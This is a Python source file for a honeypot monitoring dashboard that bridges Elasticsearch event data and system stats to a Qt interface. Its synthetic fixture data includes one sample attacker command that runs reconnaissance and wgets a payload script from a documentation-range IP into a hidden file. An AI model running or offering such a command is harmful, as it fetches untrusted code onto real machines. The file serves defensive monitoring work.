"""Qt bridge: all I/O stays in workers, all models stay on the GUI thread."""

from datetime import datetime, timedelta, timezone
import logging
import math
import subprocess
import threading
import time
from typing import Any

from elasticsearch import ApiError, Elasticsearch
from elastic_transport import TransportError
from PyQt6.QtCore import QAbstractListModel, QByteArray, QModelIndex, QObject, QThread, QTimer, Qt, pyqtProperty, pyqtSignal, pyqtSlot

from modules.events import Acquisition, EventBuffer, TIMEFRAMES, normalize
from modules.system import SystemSampler, control


class EventModel(QAbstractListModel):
    names = ("identity", "timestamp", "honeypot", "country", "countryCode", "sourceIp", "protocol", "latitude", "longitude", "details",
             "reputation", "username", "password", "command", "destinationLatitude", "destinationLongitude")

    def __init__(self, parent: QObject | None = None) -> None:
        super().__init__(parent)
        self.rows: list[dict[str, Any]] = []

    def roleNames(self) -> dict[int, QByteArray]:
        return {int(Qt.ItemDataRole.UserRole) + index: QByteArray(name.encode()) for index, name in enumerate(self.names)}

    def rowCount(self, parent: QModelIndex = QModelIndex()) -> int:
        return 0 if parent.isValid() else len(self.rows)

    def data(self, index: QModelIndex, role: int = int(Qt.ItemDataRole.DisplayRole)) -> Any:
        offset = role - int(Qt.ItemDataRole.UserRole)
        if index.isValid() and 0 <= index.row() < len(self.rows) and 0 <= offset < len(self.names):
            return self.rows[index.row()][self.names[offset]]
        return None

    def update(self, desired: list[dict[str, Any]]) -> None:
        for position, event in enumerate(desired):
            existing = next((index for index in range(position, len(self.rows))
                             if self.rows[index]["identity"] == event["identity"]), None)
            if existing is None:
                self.beginInsertRows(QModelIndex(), position, position)
                self.rows.insert(position, event)
                self.endInsertRows()
            elif existing != position:
                self.beginMoveRows(QModelIndex(), existing, existing, QModelIndex(), position)
                self.rows.insert(position, self.rows.pop(existing))
                self.endMoveRows()
            if self.rows[position] != event:
                self.rows[position] = event
                self.dataChanged.emit(self.index(position), self.index(position))
        if len(self.rows) > len(desired):
            self.beginRemoveRows(QModelIndex(), len(desired), len(self.rows) - 1)
            del self.rows[len(desired):]
            self.endRemoveRows()


class Worker(QThread):
    snapshot = pyqtSignal(dict)

    def __init__(self) -> None:
        super().__init__()
        self.stop = threading.Event()
        self.delivered = threading.Event()
        self.delivered.set()

    def publish(self, data: dict[str, Any]) -> None:
        # At most one queued snapshot per worker, even if the UI falls behind.
        if self.delivered.is_set():
            self.delivered.clear()
            self.snapshot.emit(data)


class DataWorker(Worker):
    def __init__(self, fixture: str | None) -> None:
        super().__init__()
        self.fixture = fixture
        self.timeframe = "1h"
        self.lock = threading.Lock()

    def request(self, timeframe: str) -> None:
        with self.lock:
            self.timeframe = timeframe

    def run(self) -> None:
        if self.fixture:
            self.run_fixture()
            return
        client = Elasticsearch("http://127.0.0.1:64298", request_timeout=3, max_retries=0)
        acquisition = Acquisition(client, cancelled=self.stop.is_set)
        next_events = next_stats = 0.0
        failures = 0
        last_frame = ""
        validated = False
        pending: dict[str, Any] = {}
        try:
            while not self.stop.is_set():
                now = time.monotonic()
                with self.lock:
                    frame = self.timeframe
                data: dict[str, Any] = {}
                if now >= next_events:
                    try:
                        if not validated:
                            version = client.info()["version"]["number"]
                            if not isinstance(version, str):
                                raise ValueError("Elasticsearch returned an invalid version")
                            if int(version.split(".")[0]) != 9:
                                raise ValueError(f"Elasticsearch 9 required; server reports {version}. Check the dev image versions.")
                            validated = True
                        data.update(acquisition.poll(datetime.now(timezone.utc)))
                        data["eventsOk"] = True
                        failures = 0
                    except (ApiError, TransportError, TimeoutError, ValueError, KeyError) as error:
                        if isinstance(error, ApiError) and error.status_code == 404:
                            acquisition.pit = None
                        failures += 1
                        logging.warning("Event acquisition failed: %s", error)
                        data["eventsError"] = f"{type(error).__name__}: {error}"
                    next_events = time.monotonic() + (1 if failures == 0 else min(30, 2 ** min(failures, 5)))
                if validated and not self.stop.is_set() and (now >= next_stats or frame != last_frame):
                    data["statsTimeframe"] = frame
                    try:
                        data.update(acquisition.statistics(frame))
                        data["statsOk"] = True
                    except (ApiError, TransportError, TimeoutError, ValueError, KeyError) as error:
                        logging.warning("Statistics acquisition failed: %s", error)
                        data["statsError"] = f"{type(error).__name__}: {error}"
                    next_stats = time.monotonic() + 5
                    last_frame = frame
                if data:
                    for source in ("events", "stats"):
                        if data.get(source + "Ok"):
                            pending.pop(source + "Error", None)
                        elif source + "Error" in data:
                            pending.pop(source + "Ok", None)
                    pending.update(data)
                if pending and self.delivered.is_set():
                    self.publish(dict(pending))
                    pending.clear()
                self.stop.wait(0.1)
        except InterruptedError:
            logging.info("Acquisition stopped")
        finally:
            try:
                acquisition.close()
            except (ApiError, TransportError) as error:
                logging.warning("Closing Elasticsearch snapshot failed: %s", error)

    def run_fixture(self) -> None:
        buffer = EventBuffer()
        tick = 0
        while not self.stop.is_set():
            tick += 1
            with self.lock:
                frame = self.timeframe
            hits = []
            if self.fixture not in ("empty", "offline"):
                for number in range(250 if self.fixture == "burst" else 6):
                    partial = self.fixture == "partial"
                    hits.append(normalize({
                        "_index": "fixture", "_id": f"{tick}-{number}",
                        "_source": {
                            "@timestamp": (datetime.now(timezone.utc) - timedelta(milliseconds=number * 10)).isoformat(),
                            "type": ("Cowrie", "Dionaea", "Tanner", "Cowrie", "Honeytrap", "Tanner")[number % 6],
                            "src_ip": "2001:db8::123" if partial else f"192.0.2.{number % 254 + 1}",
                            "dest_port": (22, 445, 80, 2222, 445, 443)[number % 6],
                            "username": ("root", "administrator", "", "support", "guest", "")[number % 6],
                            "password": ("admin123", "Password1!", "", "fixture-only", "guest", "")[number % 6],
                            "input": ("uname -a; cat /etc/os-release\nwget http://198.51.100.9/payload.sh -O /tmp/.cache",
                                      "Synthetic SMB session probe", "GET /api/login HTTP/1.1")[number % 3],
                            "ip_rep": ("Known attacker", "Scanner", "Unknown")[number % 3],
                            "geoip_ext": {} if partial else {"latitude": 48.14, "longitude": 11.58},
                            "geoip": {} if partial else {
                                "country_name": ("Germany", "United States", "Japan", "Brazil", "Netherlands", "Singapore")[number % 6],
                                "country_code2": ("DE", "US", "JP", "BR", "NL", "SG")[number % 6],
                                "region_name": ("Hesse", "Virginia", "Tokyo", "Sao Paulo", "North Holland", "Singapore")[number % 6],
                                "city_name": ("Frankfurt", "Ashburn", "Tokyo", "Sao Paulo", "Amsterdam", "Singapore")[number % 6],
                                "as_org": "AS64500 / Example Research Network",
                                "latitude": (50.11, 38.9, 35.68, -23.55, 52.37, 1.35)[number % 6],
                                "longitude": (8.68, -77.04, 139.76, -46.63, 4.9, 103.82)[number % 6],
                            },
                        },
                    }))
            events, fresh = buffer.merge(hits)
            count = tick * (250 if self.fixture == "burst" else 6) if hits else 0
            counts = {duration: baseline + count if hits else 0 for duration, baseline in
                      (("1m", 42), ("15m", 762), ("1h", 3186), ("24h", 28641))}
            scale = counts[frame] / 3186
            seconds = {"1m": 1, "15m": 15, "1h": 60, "24h": 1440}[frame]
            end = int(time.time() // seconds) * seconds * 1000
            data = {
                "events": [event.variant() for event in events],
                "fresh": [event.variant() for event in fresh[:32]],
                "counts": counts,
                "timeframe": frame,
                "timeline": [int((math.sin(index / 4 + tick / 3) + 1) * 30) if hits else 0 for index in range(60)],
                "timelineTimes": [end - (59 - index) * seconds * 1000 for index in range(60)],
                "countries": [{"name": name, "count": round((1268, 872, 465, 318)[index] * scale), "code": code}
                              for index, (name, code) in enumerate((("Germany", "de"), ("United States", "us"), ("Japan", "jp"), ("Brazil", "br")))] if hits else [],
                "honeypots": [{"name": name, "count": round((1482, 908, 465, 331)[index] * scale)}
                             for index, name in enumerate(("Cowrie", "Dionaea", "Tanner", "Honeytrap"))] if hits else [],
                "services": [{"name": name, "count": round((1482, 908, 465, 331)[index] * scale)}
                             for index, name in enumerate(("SSH / 22", "SMB / 445", "HTTP / 80", "SSH / 2222"))] if hits else [],
                "notice": "Synthetic burst: visible feed and map effects are capped." if self.fixture == "burst" else "",
            }
            if self.fixture == "offline":
                data.update(eventsError="Fixture: Elasticsearch unavailable", statsError="Fixture: statistics unavailable")
                data.pop("counts")
                data.pop("timeline")
            else:
                data.update(eventsOk=True, statsOk=True)
            self.publish(data)
            self.stop.wait(1)


class SystemWorker(Worker):
    def __init__(self, fixture: str | None) -> None:
        super().__init__()
        self.fixture = fixture
        self.actions: list[tuple[str, int | None]] = []
        self.lock = threading.Lock()

    def enqueue(self, action: str, value: int | None = None) -> None:
        with self.lock:
            if action == "brightness":
                self.actions = [item for item in self.actions if item[0] != "brightness"]
            if len(self.actions) >= 4:
                raise ValueError("System action queue is full")
            self.actions.append((action, value))

    def run(self) -> None:
        sampler = None if self.fixture else SystemSampler()
        next_sample = next_network = 0.0
        pending: dict[str, Any] = {}
        try:
            while not self.stop.is_set():
                with self.lock:
                    action = self.actions.pop(0) if self.actions else None
                if action:
                    try:
                        name, value = action
                        if self.fixture:
                            pending["actionMessage"] = f"Fixture: {name} simulated; no hardware action."
                            if name == "brightness":
                                pending["brightness"] = value
                        elif sampler is not None:
                            result = sampler.manual_brightness(value) if name == "brightness" and value is not None else control(name)
                            pending.update(result)
                            pending["actionMessage"] = f"{name} requested."
                    except (OSError, ValueError, KeyError, subprocess.SubprocessError) as error:
                        logging.error("System action failed: %s", error)
                        pending["actionMessage"] = f"Action failed: {error}"
                now = time.monotonic()
                if now >= next_sample:
                    if sampler is not None:
                        pending.update(sampler.sample())
                        if pending.get("shutdown"):
                            try:
                                control("poweroff")
                                pending["actionMessage"] = "Critical battery: shutdown requested."
                            except (OSError, ValueError, subprocess.SubprocessError) as error:
                                logging.error("Battery shutdown failed: %s", error)
                                pending["actionMessage"] = f"Critical battery shutdown failed: {error}"
                                sampler.policy.shutdown_requested = False
                                sampler.policy.low_samples = 0
                    else:
                        pending.update({
                            "cpu": 12.5, "ramUsed": 3600, "ramTotal": 8192, "temperature": 48.5,
                            "battery": {"voltage": 6.15 if self.fixture == "low-battery" else 7.7,
                                        "current": -0.8, "watts": 6.2,
                                        "percentage": 6 if self.fixture == "low-battery" else 71,
                                        "charging": self.fixture == "charging"},
                            "history": [5.5 + math.sin(index / 6) for index in range(120)],
                            "error": "", "brightness": pending.get("brightness", 60),
                        })
                    next_sample = time.monotonic() + 5
                if now >= next_network:
                    if sampler is not None:
                        pending.update(sampler.network())
                    else:
                        pending.update({
                            "localIp": "192.0.2.10", "externalIp": "198.51.100.10", "signal": 82,
                            "containers": [{"name": name, "state": "running", "status": "Fixture: healthy"}
                                           for name in ("cowrie", "dionaea", "elasticsearch", "logstash")],
                            "networkError": "",
                        })
                    next_network = time.monotonic() + 30
                if pending and self.delivered.is_set():
                    self.publish(dict(pending))
                    pending.clear()
                self.stop.wait(0.1)
        finally:
            if sampler is not None:
                sampler.close()


class Backend(QObject):
    stateChanged = pyqtSignal()
    selectedChanged = pyqtSignal()
    pings = pyqtSignal(list)

    def __init__(self, fixture: str | None = None) -> None:
        super().__init__()
        self.model = EventModel(self)
        self._state: dict[str, Any] = {
            "fixture": bool(fixture), "fixtureScenario": fixture or "", "timeframe": "1h",
            "counts": {}, "timeline": [], "timelineTimes": [], "countries": [], "honeypots": [], "services": [],
            "eventsError": "Waiting for Elasticsearch", "statsError": "Waiting for statistics",
            "system": {"battery": {}, "history": [], "containers": []},
            "notice": "", "eventAge": -1, "statsAge": -1, "actionMessage": "",
            "statsRevision": 0, "systemRevision": 0, "chartTimeframe": "1h",
            "following": True,
            "recentEvents": [],
            "eventsRevision": 0,
        }
        self._selected: dict[str, Any] = {}
        self.last_events = self.last_stats = 0.0
        self.data_worker = DataWorker(fixture)
        self.system_worker = SystemWorker(fixture)
        self.data_worker.snapshot.connect(self.receive_data)
        self.system_worker.snapshot.connect(self.receive_system)
        self.timer = QTimer(self)
        self.timer.timeout.connect(self.age)
        self.timer.start(1000)

    @pyqtProperty(QObject, constant=True)
    def events(self) -> EventModel:
        return self.model

    @pyqtProperty("QVariantMap", notify=stateChanged)
    def state(self) -> dict[str, Any]:
        return self._state

    @pyqtProperty("QVariantMap", notify=selectedChanged)
    def selected(self) -> dict[str, Any]:
        return self._selected

    def start(self) -> None:
        self.data_worker.start()
        self.system_worker.start()

    def close(self) -> None:
        self.timer.stop()
        for worker in (self.data_worker, self.system_worker):
            worker.stop.set()
        for worker in (self.data_worker, self.system_worker):
            worker.wait()

    @pyqtSlot(dict)
    def receive_data(self, data: dict[str, Any]) -> None:
        try:
            if "events" in data:
                self.model.update(data["events"])
                self._state["recentEvents"] = [dict(event) for event in self.model.rows[:3]]
                self._state["eventsRevision"] += 1
                if self._state["following"] and self.model.rows:
                    self._selected = dict(self.model.rows[0])
                    self.selectedChanged.emit()
            if data.get("eventsOk"):
                self.last_events = time.monotonic()
                self._state["eventsError"] = ""
                self._state["eventAge"] = 0
            if data.get("statsOk") and data["timeframe"] == self._state["timeframe"]:
                self.last_stats = time.monotonic()
                self._state["statsError"] = ""
                for key in ("counts", "timeline", "timelineTimes", "countries", "honeypots", "services"):
                    self._state[key] = data[key]
                self._state["chartTimeframe"] = data["timeframe"]
                self._state["statsRevision"] += 1
            for key in ("eventsError", "statsError", "notice"):
                if key in data:
                    if key == "statsError" and data.get("statsTimeframe", data.get("timeframe")) != self._state["timeframe"]:
                        continue
                    self._state[key] = data[key]
            if data.get("fresh"):
                self.pings.emit(data["fresh"])
            self.stateChanged.emit()
        finally:
            self.data_worker.delivered.set()

    @pyqtSlot(dict)
    def receive_system(self, data: dict[str, Any]) -> None:
        try:
            self._state["system"].update(data)
            self._state["systemRevision"] += 1
            if "actionMessage" in data:
                self._state["actionMessage"] = data["actionMessage"]
            self.stateChanged.emit()
        finally:
            self.system_worker.delivered.set()

    @pyqtSlot()
    def age(self) -> None:
        now = time.monotonic()
        self._state["eventAge"] = int(now - self.last_events) if self.last_events else -1
        self._state["statsAge"] = int(now - self.last_stats) if self.last_stats else -1
        self.stateChanged.emit()

    @pyqtSlot(str)
    def selectTimeframe(self, timeframe: str) -> None:
        if timeframe not in TIMEFRAMES:
            logging.error("Invalid timeframe requested: %s", timeframe)
            self._state["actionMessage"] = "Invalid timeframe"
        elif timeframe != self._state["timeframe"]:
            self._state["timeframe"] = timeframe
            self._state["statsError"] = "Refreshing selected timeframe"
            self.data_worker.request(timeframe)
        self.stateChanged.emit()

    @pyqtSlot(str)
    def selectEvent(self, identity: str) -> None:
        selected = next((event for event in self.model.rows if event["identity"] == identity), None)
        if selected is None:
            logging.warning("Selected event is no longer in the live buffer: %s", identity)
            self._state["actionMessage"] = "Event is no longer in the live buffer"
            self.stateChanged.emit()

            return
        self._selected = dict(selected)
        self._state["following"] = False
        self.selectedChanged.emit()
        self.stateChanged.emit()

    @pyqtSlot()
    def followLive(self) -> None:
        self._state["following"] = True
        if self.model.rows:
            self._selected = dict(self.model.rows[0])
            self.selectedChanged.emit()
        self.stateChanged.emit()

    @pyqtSlot(str)
    def action(self, name: str) -> None:
        if name not in ("reboot", "poweroff"):
            logging.error("Invalid system action: %s", name)
            self._state["actionMessage"] = "Invalid system action"
        else:
            try:
                self.system_worker.enqueue(name)
                self._state["actionMessage"] = f"Requesting {name}..."
            except ValueError as error:
                logging.error("%s", error)
                self._state["actionMessage"] = str(error)
        self.stateChanged.emit()

    @pyqtSlot(int)
    def brightness(self, percentage: int) -> None:
        try:
            if not 5 <= percentage <= 100:
                raise ValueError("Brightness must be between 5 and 100 percent")
            self.system_worker.enqueue("brightness", percentage)
        except ValueError as error:
            logging.error("%s", error)
            self._state["actionMessage"] = str(error)
            self.stateChanged.emit()
